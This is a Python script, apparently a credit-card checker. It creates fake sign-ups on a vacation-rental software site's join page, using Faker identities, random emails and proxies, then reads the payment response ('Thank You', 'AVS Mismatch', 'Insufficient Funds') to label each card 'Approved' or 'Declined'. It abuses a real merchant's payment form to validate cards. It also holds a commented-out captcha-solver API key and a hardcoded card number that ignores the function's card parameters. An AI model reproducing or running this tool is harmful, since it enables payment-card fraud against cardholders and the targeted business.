import requests
import asyncio
import capsolver
from httpx import AsyncClient
from faker import Faker
import random,string
#capsolver.api_key = "CAP-02DB3E5188C3DDD58C43DCF9B69FE560"

fake = Faker()

def random_email() -> str:
    return (
        "".join(random.choice(string.ascii_letters) for x in range(15))
    ) + "@gmail.com"

email = random_email()
async def authnet555(cc, mes, ano, cvv,proxyg):
    async with AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None) as web:
        ip = await web.get('https://api.ipify.org/')    
        print(ip.text)
        req1 = await web.get('https://app.ownerrez.com/join')
        token = req1.text.split('name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': 'FirstReferrer=https://www.google.com/; LandingPage=http://www.ownerrez.com/?utm_campaign=na+pmax+retargeting+awareness8+24&utm_source=google&utm_medium=cpc&utm_content=pmax+retargeting+display&utm_source=google&utm_medium=cpc&utm_campaign=21585779911&utm_content=&utm_term=&creative=&gad_source=1; _gcl_gs=2.1.k1$i1731245350$u122514965; _ga=GA1.1.2041587959.1731245352; __RequestVerificationToken=RFi_SQXEH1HwvZDmAR0bl8OYC1HGCA8XAzicm7Bya6Cm0yzZd7oKtV9DE_gb1PxaXqlhHlJqmcRGOFMmjlygcDiRCGU1; _rdt_uuid=1731245351359.fc8948de-e103-4565-a185-f7fb7f5c1d94; _ga_X6CJLC5WSP=GS1.1.1731245351.1.1.1731245438.37.0.1614991968',
            'origin': 'https://app.ownerrez.com',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://app.ownerrez.com/join',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }

        data = {
            '__RequestVerificationToken': token,
            'TimeZone': fake.timezone(),
            'FirstName': fake.first_name(),
            'LastName': fake.last_name(),
            'TrapName': '',
            'EmailAddress': email,
            'Password': 'sX6Pg7vLcPv!CXG',
            'ConfirmPassword': 'sX6Pg7vLcPv!CXG',
            'CardNumber': '4124510160385648',
            'CardMonth': '6',
            'CardYear': '2029',
            'CardCcv': '0000',
            'Phone.Original': fake.phone_number(),
            'Phone.E164': fake.phone_number(),
            'Phone.Extension': '',
            'Address.Id': '',
            'Address.CountryId': '226',
            'Address.Street1': fake.street_address(),
            'Address.Street2': '',
            'Address.City': fake.city(),
            'Address.StateId': '34',
            'Address.Province': '',
            'Address.PostalCode': fake.zipcode(),
            'IsAgreeToTerms': [
                'true',
                'false',
            ],
            'IsAgreeToRefundPolicy': [
                'true',
                'false',
            ],
            'SubscribeToImportantBlogPosts': [
                'true',
                'false',
            ],
            'SubscribeToLessImportantBlogPosts': 'false',
        }

        req2 = await web.post('https://app.ownerrez.com/join',headers=headers, data=data)
        with open("respcharged2.txt", "+w",encoding="utf-8") as u:u.write(req2.text)
    if "Thank You" in req2.text:
        status = "Approved ✅"
        mensaje = "Approved"
    else:
        mensaje = req2.text.split('<div class="validation-summary-errors alert alert-danger" data-valmsg-summary="true"><ul><li>')[1].split('</li>')[0]
        
        if "AVS Mismatch" in mensaje:
            status = "Approved ✅"
        elif "Insufficient Funds" in mensaje or "Funds" in mensaje:
            status = "Approved ✅"
        else:
            status = "Declined ❌"

    return mensaje, status